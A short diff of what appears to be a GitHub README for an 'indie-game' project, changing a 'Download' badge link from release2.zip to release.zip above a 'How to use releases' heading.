@@ -1,4 +1,4 @@
-[![Explore Now](https://img.shields.io/badge/Download-brightgreen?style=for-the-badge)](https://github.com/DivanshLpu/indie-game/blob/main/release2.zip)
+[![Explore Now](https://img.shields.io/badge/Download-brightgreen?style=for-the-badge)](https://github.com/DivanshLpu/indie-game/blob/main/release.zip)
 
 
 # How to use releases
